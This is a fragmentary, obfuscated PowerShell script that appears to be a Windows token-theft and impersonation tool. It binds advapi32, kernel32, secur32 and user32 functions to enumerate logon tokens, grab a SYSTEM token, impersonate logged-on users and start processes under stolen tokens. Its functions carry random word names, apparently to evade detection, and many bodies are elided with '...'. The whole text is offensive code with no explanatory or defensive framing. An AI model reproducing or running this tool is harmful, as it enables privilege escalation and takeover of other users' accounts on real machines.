function pedagogic
{
    ...
    $OpenProcessAddr = disillusionment kernel32.dll OpenProcess
	$OpenProcessDelegate = Rubik @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $OpenProcessTokenAddr = disillusionment advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Rubik @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    ...
    $GetTokenInformationAddr = disillusionment advapi32.dll GetTokenInformation
	$GetTokenInformationDelegate = Rubik @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    ...
    $SetThreadTokenAddr = disillusionment advapi32.dll SetThreadToken
	$SetThreadTokenDelegate = Rubik @([IntPtr], [IntPtr]) ([Bool])
    ...
    $ImpersonateLoggedOnUserAddr = disillusionment advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Rubik @([IntPtr]) ([Bool])
    ...
    $RevertToSelfAddr = disillusionment advapi32.dll RevertToSelf
	$RevertToSelfDelegate = Rubik @() ([Bool])
	$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
    $LsaGetLogonSessionDataAddr = disillusionment secur32.dll LsaGetLogonSessionData
	$LsaGetLogonSessionDataDelegate = Rubik @([IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    ...
    $CreateProcessWithTokenWAddr = disillusionment advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Rubik @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    ...
    $memsetAddr = disillusionment msvcrt.dll memset
	$memsetDelegate = Rubik @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
    $DuplicateTokenExAddr = disillusionment advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Rubik @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
    ...
    $LookupAccountSidWAddr = disillusionment advapi32.dll LookupAccountSidW
	$LookupAccountSidWDelegate = Rubik @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    ...
    $CloseHandleAddr = disillusionment kernel32.dll CloseHandle
	$CloseHandleDelegate = Rubik @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    $LsaFreeReturnBufferAddr = disillusionment secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Rubik @([IntPtr]) ([UInt32])
    ...
    $OpenThreadAddr = disillusionment kernel32.dll OpenThread
	$OpenThreadDelegate = Rubik @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
    $OpenThreadTokenAddr = disillusionment advapi32.dll OpenThreadToken
	$OpenThreadTokenDelegate = Rubik @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
	$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
    $CreateProcessAsUserWAddr = disillusionment advapi32.dll CreateProcessAsUserW
	$CreateProcessAsUserWDelegate = Rubik @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    ...
    $OpenWindowStationWAddr = disillusionment user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Rubik @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ...
    $OpenDesktopAAddr = disillusionment user32.dll OpenDesktopA
    $OpenDesktopADelegate = Rubik @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)
    $ImpersonateSelfAddr = disillusionment Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Rubik @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
    $LookupPrivilegeValueAddr = disillusionment Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Rubik @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
    $AdjustTokenPrivilegesAddr = disillusionment Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Rubik @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
    $GetCurrentThreadAddr = disillusionment kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Rubik @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
    $GetSecurityInfoAddr = disillusionment advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Rubik @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    ...
    $SetSecurityInfoAddr = disillusionment advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Rubik @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ...
    $GetAceAddr = disillusionment advapi32.dll GetAce
    $GetAceDelegate = Rubik @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)
    $LookupAccountSidWAddr = disillusionment advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Rubik @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)
    $AddAccessAllowedAceAddr = disillusionment advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Rubik @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ...
    $CreateWellKnownSidAddr = disillusionment advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Rubik @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ...
    $SetEntriesInAclWAddr = disillusionment advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Rubik @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    ...
    $LocalFreeAddr = disillusionment kernel32.dll LocalFree
    $LocalFreeDelegate = Rubik @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
    $LookupPrivilegeNameWAddr = disillusionment advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Rubik @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    ...
    function cakes
    {
        extraditions -Privilege SeSecurityPrivilege
            ...
            else
            {
                    ...
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    ...
                    else
                    {
                        ...
                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Stengel $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
                        $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                        for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                        {
                            $LuidAndAttributePtr = [IntPtr](Stengel $PrivilegesBasePtr ($LuidAndAttributeSize * $i))
    ...
    function acidulous
    {
        ...
        Write-Verbose "Entering acidulous"
        [IntPtr]$NewHToken = [IntPtr]::Zero
        ...
        else
        {
            ...
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                ...
                extraditions -Privilege SeAssignPrimaryTokenPrivilege
    ...
    function indulgent
    {
        ...
        foreach ($Obj in $TokenInfoObjs)
        {
            ...
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in indulgent. ErrorCode: $ErrorCode"
            }
    ...
    function landladies
    {
        ...
        {
            $SystemTokenInfo = crinolines -ProcessId $SystemToken.ProcessId -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
            if ($SystemTokenInfo) { break }
        }
        if ($SystemTokenInfo -eq $null -or (-not (counterpoints -hToken $systemTokenInfo.hProcToken)))
        {
        ...
        foreach ($Process in $ProcessIds)
        {
            ...
            if ($PrimaryTokenInfo -ne $null)
            {
                ...
                {
                    $ThreadTokenInfo = stealthy -ThreadId $Thread.Id
    ...
    function Main
    {
        ...
        {
            $AllTokens = landladies
            
            [IntPtr]$hToken = [IntPtr]::Zero
            $UniqueTokens = (strident -AllTokens $AllTokens).TokenByUser
            ...
            if ($PsCmdlet.ParameterSetName -ieq "CreateProcess")
            {
                ...
                acidulous -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru
                umlauts
            }
            elseif ($ImpersonateUser)
            {
                counterpoints -hToken $hToken | Out-Null
                Write-Output "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            indulgent -TokenInfoObjs $AllTokens
        }
        ...
        else #Enumerate tokens
        {
            ...
            {
                Write-Output (strident -AllTokens $AllTokens).TokenByUser.Values
            }
            umlauts
            indulgent -TokenInfoObjs $AllTokens
        }
